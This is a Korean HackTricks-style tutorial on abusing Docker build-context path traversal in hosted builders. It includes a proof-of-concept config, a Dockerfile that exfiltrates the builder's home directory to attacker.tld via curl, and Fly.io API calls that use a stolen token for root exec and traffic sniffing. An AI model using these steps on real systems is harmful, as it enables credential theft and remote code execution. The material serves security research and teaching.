# Hosted Builders에서 Docker Build Context 악용 (Path Traversal, Exfil, and Cloud Pivot)

{{#include ../banners/hacktricks-training.md}}

## TL;DR

CI/CD 플랫폼이나 hosted builder가 기여자에게 Docker build context 경로와 Dockerfile 경로를 지정하도록 허용하면, context를 상위 디렉토리(예: "..")로 설정해 호스트 파일을 build context의 일부로 만들 수 있는 경우가 많습니다. 그러면 공격자가 제어하는 Dockerfile이 COPY로 빌더 사용자 홈(예: ~/.docker/config.json)에 있는 비밀을 exfiltrate할 수 있습니다. 도난당한 registry tokens는 provider의 control-plane APIs에 대해 작동하여 조직 전체의 RCE를 가능하게 할 수도 있습니다.

## 공격 표면

많은 hosted builder/registry 서비스는 사용자가 제출한 이미지를 빌드할 때 대략 다음과 같은 작업을 수행합니다:
- repo-level config를 읽는데 여기에는 다음이 포함됩니다:
- build context path (Docker daemon으로 전송됨)
- Dockerfile path (해당 context에 상대적)
- 지정된 build context 디렉토리와 Dockerfile을 Docker daemon으로 복사
- 이미지를 빌드하고 hosted service로 실행

플랫폼이 build context를 canonicalize하거나 제한하지 않으면 사용자가 그것을 저장소 외부의 위치(path traversal)로 설정할 수 있으며, 이로 인해 빌드 사용자가 읽을 수 있는 임의의 호스트 파일들이 build context의 일부가 되어 Dockerfile에서 COPY로 접근 가능해집니다.

일반적으로 관찰되는 실무적 제약:
- Dockerfile은 선택한 context path 내에 있어야 하며 그 경로는 사전에 알려져 있어야 합니다.
- 빌드 사용자가 context에 포함된 파일들을 읽을 수 있는 권한이 있어야 합니다; 특수 디바이스 파일은 복사를 실패시킬 수 있습니다.

## PoC: Docker build context를 통한 Path traversal

상위 디렉토리 컨텍스트 내에 Dockerfile을 선언한 악성 서버 구성 예:
```yaml
runtime: "container"
build:
dockerfile: "test/Dockerfile"   # Must reside inside the final context
dockerBuildPath: ".."           # Path traversal to builder user $HOME
startCommand:
type: "http"
configSchema:
type: "object"
properties:
apiKey:
type: "string"
required: ["apiKey"]
exampleConfig:
apiKey: "sk-example123"
```
- Using ".." often resolves to the builder user’s home (e.g., /home/builder), which typically contains sensitive files.
- Place your Dockerfile under the repo’s directory name (e.g., repo "test" → test/Dockerfile) so it remains within the expanded parent context.

## PoC: Dockerfile to ingest and exfiltrate the host context
```dockerfile
FROM alpine
RUN apk add --no-cache curl
RUN mkdir /data
COPY . /data                      # Copies entire build context (now builder’s $HOME)
RUN curl -si https://attacker.tld/?d=$(find /data | base64 -w 0)
```
$HOME에서 일반적으로 회수되는 대상:
- ~/.docker/config.json (registry auths/tokens)
- 기타 cloud/CLI 캐시 및 설정(예: ~/.fly, ~/.kube, ~/.aws, ~/.config/*)

팁: 저장소에 .dockerignore가 있더라도 취약한 플랫폼 측의 context selection이 무엇이 daemon으로 전송되는지를 결정합니다. 플랫폼이 선택된 경로를 repo의 .dockerignore를 평가하기 전에 daemon으로 복사하면 호스트 파일이 여전히 노출될 수 있습니다.

## Cloud pivot with overprivileged tokens (example: Fly.io Machines API)

일부 플랫폼은 container registry와 control-plane API 모두에 사용할 수 있는 단일 bearer token을 발급합니다. registry token을 exfiltrate했다면 provider API에 대해 시도해보세요.

예: ~/.docker/config.json에서 훔친 token을 사용한 Fly.io Machines API에 대한 API 호출 예:

조직에서 앱 열거:
```bash
curl -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps?org_slug=smithery"
```
앱의 어떤 머신에서든 root로 명령 실행:
```bash
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"","command":["id"],"container":"","stdin":"","timeout":5}'
```
결과: 토큰이 충분한 권한을 가진 경우, 모든 호스팅된 앱에서 조직 전반에 걸친 remote code execution.

## 탈취된 호스팅 서비스에서의 비밀 탈취

호스팅된 서버에서 exec/RCE를 획득하면, 클라이언트가 제공한 비밀(API keys, tokens)을 수집하거나 prompt-injection 공격을 수행할 수 있습니다. 예: tcpdump를 설치하고 port 8080의 HTTP 트래픽을 캡처하여 들어오는 자격 증명을 추출합니다.
```bash
# Install tcpdump inside the machine
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"apk add tcpdump","command":[],"container":"","stdin":"","timeout":5}'

# Capture traffic
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"tcpdump -i eth0 -w /tmp/log tcp port 8080","command":[],"container":"","stdin":"","timeout":5}'
```
캡처된 요청에는 종종 헤더, 본문 또는 쿼리 파라미터에 클라이언트 자격 증명이 포함되어 있습니다.

## 참조

- [Breaking MCP Server Hosting: Build-Context Path Traversal to Org-wide RCE and Secret Theft](https://blog.gitguardian.com/breaking-mcp-server-hosting/)
- [Fly.io Machines API](https://fly.io/docs/machines/api/)

{{#include ../banners/hacktricks-training.md}}
